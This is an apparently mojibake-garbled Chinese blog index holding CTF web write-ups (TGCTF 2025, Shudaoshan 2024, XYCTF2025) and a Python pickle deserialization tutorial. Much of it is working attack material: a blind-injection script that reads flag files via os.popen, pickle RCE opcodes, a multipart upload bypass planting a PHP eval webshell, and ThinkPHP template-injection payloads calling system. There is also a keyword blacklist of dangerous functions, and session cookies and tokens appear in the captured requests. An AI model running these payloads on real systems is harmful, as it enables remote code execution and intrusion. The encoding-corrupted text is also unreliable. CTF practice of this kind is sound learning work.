åŸç†é€šè¿‡æ•…æ„è§¦å‘ç¨‹åºä¸­çš„å¼‚å¸¸ï¼ˆé”™è¯¯ï¼‰ï¼Œåˆ©ç”¨å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸­çš„æ¼æ´æ‰§è¡Œæ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ¨æ€ä»£ç æ‰§è¡Œç¯å¢ƒï¼ˆå¦‚evalï¼‰ä¸­ï¼Œæ”»å‡»è€…æ„é€ è¾“å…¥å¼•å‘å¼‚å¸¸ï¼ŒåŒæ—¶æ³¨å…¥æ¶æ„ä»£ç ã€‚ åšé¢˜æ€è€ƒæ­¥éª¤ï¼š è¾“å…¥æ„é€ ï¼šæäº¤åŒ…å«æ¶æ„ä»£ç çš„è¾“å…¥ï¼Œå¦‚1 + aå¼•å‘ç±»å‹é”™è¯¯ã€‚ å¼‚å¸¸è§¦å‘ï¼šæœåŠ¡å™¨å¤„ç†è¾“å…¥æ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œè¿›å…¥é”™è¯¯å¤„ç†æµç¨‹ã€‚ ä»£ç æ³¨å…¥ï¼šåœ¨å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæ¶æ„ä»£ç è¢«è§£ææ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œé€šè¿‡__import__(os).system(ls)æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ç»•è¿‡é™åˆ¶ï¼šåˆ©ç”¨åå°„æˆ–å†…ç½®å¯¹è±¡ï¼ˆå¦‚__builtins__ï¼‰ç»•è¿‡æ²™ç®±é™åˆ¶ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ æ³•2ï¼šå¸ƒå°”ç›²æ³¨import stringimport requestsfrom tqdm import tqdmurl = flag=for i in range(len(flag),50): # for s in TGCTF: for s in tqdm(-+++string.ascii_lowercase+string.digits): data = expr:fimport os,operator;f=os.popen(cat /f*).read();a=int(operator.eq(f[i],s));1/a # res = requests.post(url, data=json) res = requests.post(url, data=data) # print(res.text, s) if res.text != A server error occurred. Please contact the administrator.: flag += s print(flag) break print(i)s æ³•3ï¼špyramidå†…å­˜é©¬æ¨èè¿™ç¯‡å¸ˆå‚…çš„æ–‡ç« æ https://www.yuque.com/polestar-mzvgl/swtget/zuh78rfp7i67u219#AWd8j ä¹Ÿå¯ä»¥çœ‹æˆ‘çš„åšå®¢å†…ç½®æ–‡ç«  https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/ TG_wordpressæœ‰å¾ˆå¤šæ¼æ´ç‚¹ æ²»ç†åªå†™ä¸€ç§ æ‰«æäºŒç»´ç ä¸‹ä¸‹æ¥ä¸€ä¸ªapkæ–‡ä»¶ jadxåç¼–è¯‘å å…¨å±€æœç´¢ password string name=web04+ username/password:/stringstring name=web05+ TG_wordpressor/stringstring name=web06+ aXx^oV@Kamp;cFoVaztQ*/string åœ¨loginè·¯ç”±ç™»å½• è¿›å…¥è¿‡å æŸ¥è¯¢æ’ä»¶ç¡®å®šcve çš„å‹å·(ä½ å¯ä¹Ÿç›´æ¥å¤åˆ¶æ’ä»¶çš„å†…å®¹ ç„¶åç›´æ¥é—®dp) TGCTF{CVE-2020-25213} TGCTF 2025 åå°ç®¡ç†SQLæ³¨å…¥","tags":["CTF-wp"]},{"title":"pickleååºåˆ—åŒ–å­¦ä¹ ","path":"/2025/04/10/pickleååºåˆ—åŒ–/","content":"å‰ç½®çŸ¥è¯†è¯¦ç»†å‰ç½®çŸ¥è¯†å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£https://docs.python.org/zh-cn/3/library/pickle.html Pickleâ€“Pythonå¯¹è±¡ååºåˆ—åŒ–Picklepickleæ˜¯pythoné‡Œä¸€ä¸ªå¯ä»¥å¯¹ä¸€ä¸ª Python å¯¹è±¡ç»“æ„çš„äºŒè¿›åˆ¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¨¡å—ã€‚pickling æ˜¯å°† Python å¯¹è±¡åŠå…¶æ‰€æ‹¥æœ‰çš„å±‚æ¬¡ç»“æ„è½¬åŒ–ä¸ºä¸€ä¸ªå­—èŠ‚æµçš„è¿‡ç¨‹ï¼Œè€Œ unpickling æ˜¯ç›¸åçš„æ“ä½œpickelå¯ä»¥çœ‹ä½œä¸€ç§ç‹¬ç«‹çš„æ ˆè¯­è¨€ï¼Œå…¶å¯¹opcodeçš„ç¼–å†™å¯ä»¥è¿›è¡Œpythonä»£ç æ‰§è¡Œã€å˜é‡è¦†ç›–ç­‰æ“ä½œã€‚ pickleåºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯¹è±¡ â€“ äºŒè¿›åˆ¶å­—èŠ‚æµ import pickle class Person(): def __init__(self): self.age=18 self.name=A p=Person()opcode=pickle.dumps(p)print(opcode) P=pickle.loads(opcode)print(The age is:+str(P.age),The name is:+P.name) //P.age æ˜¯è°ƒç”¨ageæˆå‘˜ P.name æ˜¯è°ƒç”¨nameæˆå‘˜ pickle.dumpså°†å¯¹è±¡åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚æµ pickle.loadså°†äºŒè¿›åˆ¶å­—èŠ‚æµåŒ–ä¸ºå¯¹è±¡ Pickleååºåˆ—åŒ–æ¼æ´æˆå› :å°±æ˜¯åœ¨äºŒè¿›åˆ¶å­—èŠ‚æµä¸Šåšæ‰‹è„š å°±åƒphpååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®æ ‡ import pickleimport os class Person(): def __init__(self): self.age=18 self.name=A def __reduce__(self): command=rwhoami return (os.system,(command,)) p=Person()opcode=pickle.dumps(p)print(opcode) P=pickle.loads(opcode)print(The age is:+str(P.age),The name is:+P.name) ç‰¹æ®Šå‡½æ•°__reduce__ return ä¸€ä¸ªå…ƒç»„ ç¬¬ä¸€ä¸ªæ˜¯å¯è°ƒç”¨å¯¹è±¡ ç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªå‚æ•°å…ƒç»„ åœ¨pickle.loadsçš„æ—¶å€™å°±ä¼šæ‰§è¡Œos.system(â€œwhoamiâ€) é‚£å°±æˆåŠŸæ‰§è¡Œä»»æ„pythonä»£ç äº† Pickleå·¥ä½œåŸç†ç‹¬ç«‹çš„æ ˆè¯­è¨€ï¼Œç”±ä¸€ä¸²ä¸²opcodeç»„æˆã€‚è¯­è¨€è§£æä¾é Pickle Virtual Machine(PVM)è¿›è¡Œã€‚ æŒ‡ä»¤å¤„ç†å™¨ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ã€‚ æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚ stackï¼šç”± Python çš„ list å®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚ memoï¼šç”± Python çš„ dict å®ç°ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚ å¸¸ç”¨opcodeæŒ‡ä»¤ æŒ‡ä»¤ æè¿° å…·ä½“å†™æ³• æ ˆä¸Šçš„å˜åŒ– c è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å— c[module] [instance] è·å¾—çš„å¯¹è±¡å…¥æ ˆ o å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ o è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ i ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ i[module] [callable] è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ N å®ä¾‹åŒ–ä¸€ä¸ªNone N è·å¾—çš„å¯¹è±¡å…¥æ ˆ S å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ Sâ€™xxxâ€™ ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰ è·å¾—çš„å¯¹è±¡å…¥æ ˆ V å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡ Vxxx è·å¾—çš„å¯¹è±¡å…¥æ ˆ I å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡ Ixxx è·å¾—çš„å¯¹è±¡å…¥æ ˆ F å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡ Fx.x è·å¾—çš„å¯¹è±¡å…¥æ ˆ R é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•° R å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ . ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼ . æ—  ( å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®° ( MARKæ ‡è®°å…¥æ ˆ t å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ t MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ ) å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„ ) ç©ºå…ƒç»„å…¥æ ˆ l å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨ l MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ ] å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨ ] ç©ºåˆ—è¡¨å…¥æ ˆ d å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰ d MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ } å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸ } ç©ºå­—å…¸å…¥æ ˆ p å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n pn æ—  g å°†memo_nçš„å¯¹è±¡å‹æ ˆ gn å¯¹è±¡è¢«å‹æ ˆ 0 ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡ 0 æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ b ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½® b æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ s å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­ s ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–° u å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­ u MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–° a å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­ a æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–° e å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­ e MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–° import pickle opcode=bcossystem(SwhoamitR.pickle.loads(opcode) è¿è¡Œä»¥ä¸Šä»£ç å°±ä¼šæ‰§è¡Œwhoamiå‘½ä»¤ pickletoolsç”¨è¿™ä¸ªæ¨¡å—å¯ä»¥æŠŠopcodeè½¬æ¢æˆæˆ‘ä»¬æ˜“è¯»çš„å½¢å¼ import pickletoolsopcode = bcossystem(SwhoamitR.pickletools.dis(opcode) å¾— 0: c GLOBAL os system 11: ( MARK 12: S STRING whoami 22: t TUPLE (MARK at 11) 23: R REDUCE 24: . STOPhighest protocol among opcodes = 0 Opcodeæ¼æ´åˆ©ç”¨å‘½ä»¤æ‰§è¡Œopcodeå¯ä»¥æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡æ‰‹å†™çš„æ–¹å¼æ¥è¾¾åˆ°ã€‚ opcodeä¸­ï¼Œ**.**æ˜¯ç¨‹åºç»“æŸçš„æ ‡å¿—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å»æ‰.å°†ä¸¤ä¸ªå­—èŠ‚æµæ‹¼æ¥åœ¨ä¸€èµ·ã€‚ import pickle opcode=bcossystem(SwhoamitRcossystem(SwhoamitR.pickle.loads(opcode)#å°±ä¼šæ‰§è¡Œä¸¤æ¬¡whoamiå‘½ä»¤ æ³¨æ„ï¼éƒ¨åˆ†Linuxç³»ç»Ÿä¸‹å’ŒWindowsä¸‹çš„opcodeå­—èŠ‚æµå¹¶ä¸å…¼å®¹ï¼Œæ¯”å¦‚Windowsä¸‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ä¸ºos.system()ï¼Œåœ¨éƒ¨åˆ†Linuxä¸‹åˆ™ä¸ºposix.system()ã€‚æ‰€ä»¥æœ‰æ—¶å€™linuxå’Œwinä¸‹çš„è„šæœ¬è¿è¡Œç»“æœæ˜¯ä¸åŒçš„ã€‚ R i o è¿™æ˜¯ä¸‰ä¸ªæ‰§è¡Œå‡½æ•°çš„å­—èŠ‚ç  R opcode1=bcossystem(SwhoamitR. i opcode2=b(Swhoamiiossystem. o opcode3=b(cossystemSwhoamio. å˜é‡è¦†ç›–åœ¨sessionæˆ–tokenä¸­ï¼Œç”±äºéœ€è¦å­˜å‚¨ä¸€äº›ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¸¸å¸¸èƒ½å¤Ÿçœ‹è§pickleçš„èº«å½±ã€‚ç¨‹åºä¼šå°†ç”¨æˆ·çš„å„ç§ä¿¡æ¯åºåˆ—åŒ–å¹¶å­˜å‚¨åœ¨sessionæˆ–tokenä¸­ï¼Œä»¥æ­¤æ¥éªŒè¯ç”¨æˆ·çš„èº«ä»½ã€‚æ‰€ä»¥pickleå¯ä»¥è¿›è¡Œsessionä¼ªé€ ï¼Œæ¥å˜é‡è¦†ç›–ã€‚ å®éªŒ: #test.pyimport pickleimport secretprint(secretå˜é‡çš„å€¼ä¸º: + secret.secret)opcode = bc__main__secret(SsecretSHack!!!db.fake = pickle.loads(opcode)print(secretå˜é‡çš„å€¼ä¸º: + fake.secret) #secret.pysecret = This is a key è¿™æ ·å°±å¯ä»¥æˆåŠŸè¦†ç›–åŸæ¥çš„secret pickleæš‚æ—¶å…ˆå­¦åˆ°è¿™é‡Œå§ç¬”è€…è§‰å¾—å­¦å†å¤šçš„ç†è®ºè¿˜æ˜¯å¾—åº”ç”¨ï¼Œå¦‚æœä»¥åæœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿å°±å†æ¥è¡¥å‘ğŸ¤­","tags":["CTFå­¦ä¹ "]},{"title":"èœ€é“å±±2024wp","path":"/2025/04/10/èœ€é“å±±2024-wp/","content":"å¥¶é¾™ç‰ŒWAFæ‹¿åˆ°é™„ä»¶ ä¸å‡†ä¸Šä¼ åç¼€ä¸ºphå’Œhtaçš„æ–‡ä»¶ å¹¶ä¸”å¯¹æ–‡ä»¶å¤§å°æœ‰é™åˆ¶ ä»£ç å…³é”®å¤„: move_uploaded_file å‡½æ•°å®šä¹‰å’Œç”¨æ³•ï¼šmove_uploaded_file() å‡½æ•°æŠŠä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚å¦‚æœæˆåŠŸè¯¥å‡½æ•°è¿”å› TRUEï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚ è¯­æ³•ï¼šmove_uploaded_file(file,newloc)file:å¿…éœ€ã€‚è§„å®šè¦ç§»åŠ¨çš„æ–‡ä»¶ã€‚newloc:å¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚ æç¤ºæ³¨é‡Šï¼šè¯¥å‡½æ•°ä»…ç”¨äºé€šè¿‡ HTTP POST ä¸Šä¼ çš„æ–‡ä»¶ã€‚æ³¨é‡Šï¼šå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå°†ä¼šè¢«è¦†ç›–ã€‚ é¢˜ç›®åšæ³•:å½“move_uploaded_fileå‡½æ•°å‚æ•°å¯æ§æ—¶ï¼Œå¯ä»¥å°è¯•/.ç»•è¿‡ï¼Œå› ä¸ºè¯¥å‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/.ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ save_path=1.php/.,è¿™æ ·file_extå€¼å°±ä¸ºç©ºï¼Œå°±èƒ½ç»•è¿‡é»‘åå•ï¼Œè€Œmove_uploaded_fileå‡½æ•°å¿½ç•¥æ–‡ä»¶æœ«å°¾çš„/.å¯ä»¥å®ç°ä¿å­˜æ–‡ä»¶ä¸º.php è¿™æ®µä»£ç ä»£è¡¨åªå¯¹å‰5000å­—èŠ‚è¿›è¡Œæ ¡éªŒï¼Œæ„æ€æ˜¯5000ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥å±é™©å†…å®¹(æœ¨é©¬)ã€‚ ä½¿ç”¨print(a*2000000+?php eval($_POST[1]);?) ä¸Šä¼ æ–‡ä»¶å³å¯ æ•°æ®åŒ…æ„é€  POST /?name=1.php/. HTTP/1.1Host: gz.imxbt.cn:20801Content-Length: 1048752Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Origin: http://gz.imxbt.cn:20801Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycXLzLLazg0AJNoVAAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://gz.imxbt.cn:20801/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7Cookie: PHPSESSID=8177754fd454ad57569dea76792994c9; name=!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu; GZCTF_Token=CfDJ8MKySZ_mlO1BrUTiopFb3pr4sMLMFDp7VLwqIHHQ787J8MU9o7kzKDQgSGH3aUSAFreJelz-xjNcVon1NvCY9iAKz8ktIq-qB4r2jQSniDqdjks-AlNc7Rkw9ROQ3vAa9e0N-iumHmUWe1UcvM30oD4C_p5X2rfkyF4zaLlPcJte51OO6suesKAsKpiTzQ1RvmbX-oqD9hVQaRz0jBi9xFJ7fpCIh2-_Y8UzrQ8TgMQRwpHxaUjX6TUPWl2iaCoFCXNG5RSUU5JVX6JeXurix40S_LdkKSdgdmEXKkw1XNLb5v1YDumTpaGciQGUIVoxHZRwlEtgQ5eR3pq8O1_vm4yODQYq4Y0RPvc2MoJVYLZgX1u-EsroGJdBXAMr09bPEkPJYYerhs1QlP5t2Y8A076GE8Cv82ugOHeNStUNFBf_XQwunbSKJt0FaUtv0SdEu-EKn79ZcAd4m_Ui2-DypcJ6NW7yQrVoC31ElAZuLxFCuVZP4Jw_hZxvAhETL4Pm3Jbx0XR1Dv_Eyjirco1Gtowu44qH972w0qN2sbR2iTwatubxFs39PNNj6dBeZj3MsqihIS5JgY4aY2yAiSLgV586D0zNxFepVQR6_qSzYVX61OIiXKjnRACYg6F6neFGC7YwlYz260chM2RECVTWEqQOdR02WQ6HRcoMqFiFMMXchvAX7rW8t3RJ7T6dF_eel5le5oHsYhoxevoMfddEVM8Connection: close------WebKitFormBoundarycXLzLLazg0AJNoVAContent-Disposition: form-data; name=upload_file; filename=1.php/.Content-Type: image/jpeg2000000ä¸ªa+?php eval($_POST[1]);?------WebKitFormBoundarycXLzLLazg0AJNoVA-- ä¸Šä¼ è¿æ¥èšå‰‘ æ¶æ„ä»£ç æ£€æµ‹å™¨è¿›å»å°±æ˜¯ä¸ªæ£€æµ‹å™¨ æ‰«æè·¯å¾„å‘ç°www.zip ä¸‹è½½å¾—åˆ°æºç  index.phpé‡Œæœ‰æ£€æµ‹codeçš„æºç  ?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController public function index() $code = preg_replace(/[\\;%\\\\\\\\]/, , $_POST[code]); if(preg_match(/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\\~|\\`|\\#|\\%|\\^|\\|\\*|\\-|\\+|\\[|\\]|\\_|\\|\\|\\/|\\?|\\\\\\\\/is, $code)) $attack_log_file = /tmp/attack.log; if(file_exists($attack_log_file)) file_put_contents($attack_log_file, $attack_word=\\.$code.\\;.\\r ,FILE_APPEND); require_once(/tmp/attack.log); else file_put_contents($attack_log_file, .?.php.\\r ); if(isset($attack_word)) echo æ£€æµ‹åˆ°å±é™©ä»£ç : .$attack_word.ï¼ï¼ï¼; else echo æ¬¢è¿ä½¿ç”¨gxngxngxnçš„æ¶æ„ä»£ç æ£€æµ‹å™¨ï¼ï¼ï¼; else $safe_log_file = /tmp/safe.log; if(file_exists($safe_log_file)) file_put_contents($safe_log_file, $safe_word=.$code.;.\\r ,FILE_APPEND); require_once(/tmp/safe.log); else file_put_contents($safe_log_file, .?.php.\\r ); if(isset($safe_word)) echo æœªæ£€æµ‹åˆ°å±é™©ä»£ç ï¼Œ.$safe_word.ï¼Œéå¸¸å®‰å…¨; else echo æ¬¢è¿ä½¿ç”¨gxngxngxnçš„æ¶æ„ä»£ç æ£€æµ‹å™¨ï¼ï¼ï¼; å¹¶ä¸”ä¸éš¾å‘ç°è¿™æ˜¯thinkphpçš„ç½‘ç«™ é‚£ä¹ˆè‚¯å®šæ˜¯å’Œtpæœ‰å…³çš„ç‰¹æ€§ æˆ‘è‡ªå·±åšçš„æ—¶å€™ä¸çŸ¥é“ åé¢çœ‹wpæ‰çŸ¥é“ åœ¨ ThinkPHPï¼ˆTPï¼‰æ¡†æ¶ä¸­ï¼Œ$ ç¬¦å·å¸¸ç”¨äºæ¨¡æ¿å¼•æ“çš„è¡¨è¾¾å¼è§£æã€‚åœ¨æ¨¡æ¿ä¸­ï¼Œ$ å¯ä»¥åµŒå…¥ PHP è¡¨è¾¾å¼ï¼Œè¿™äº›è¡¨è¾¾å¼ä¼šè¢«è§£æå¹¶æ‰§è¡Œã€‚å®ƒé€šå¸¸ç”¨äºè¾“å‡ºæ•°æ®æˆ–åœ¨æ¨¡æ¿ä¸­æ‰§è¡Œä¸€äº›ç®€å•çš„ PHP é€»è¾‘ã€‚ å¯ä»¥ä½¿ç”¨${} 1.ä½¿ç”¨inputå‡½æ•° input() æ˜¯ ThinkPHP 6 ä¸­çš„ä¸€ä¸ªå‡½æ•°ã€‚å®ƒæ˜¯ ThinkPHP æ¡†æ¶æä¾›çš„ä¸€ä¸ªç”¨æ¥è·å–è¯·æ±‚æ•°æ®ï¼ˆå¦‚ GETã€POST æˆ– PUT è¯·æ±‚ä¸­çš„å‚æ•°ï¼‰çš„å‡½æ•°ã€‚ code=$input(0)(input(1))0=system1=cat+/f* 2.ä½¿ç”¨unsort code=$usort((ge.tallheaders)(),sys.tem) POST /public/index.php HTTP/1.1Host: gz.imxbt.cn:20012aaa: lsContent-Length: 41User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Origin: http://gz.imxbt.cn:20012Referer: http://gz.imxbt.cn:20012/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0Connection: close","tags":["CTF-wp"]},{"title":"XYCTF2025-WEB WP","path":"/2025/04/09/XYCTF2025-WEB/","content":"å‰è¨€:ç”±äºç¬”è€…èƒ½åŠ›æœ‰é™ï¼Œåªå†™äº†è‡ªå·±èƒ½åŠ›ä»¥å†…çš„é¢˜çš„WPez_puzzlejsä»£ç æ¸¸æˆ ç¦äº†ä¸€äº›å¸¸ç”¨å¿«æ·é”® æˆ‘çš„åšæ³•æ˜¯å°†æ‰€æœ‰ä»£ç æ‹‰ä¸‹æ¥ è‡ªå·±æœ¬åœ°ç”¨phpstudyèµ·äº†ä¸€ä¸ªæœåŠ¡ å…·ä½“æ”¹æºä»£ç é€»è¾‘ if (G yw4) æ”¹ä¸º if (G yw4) 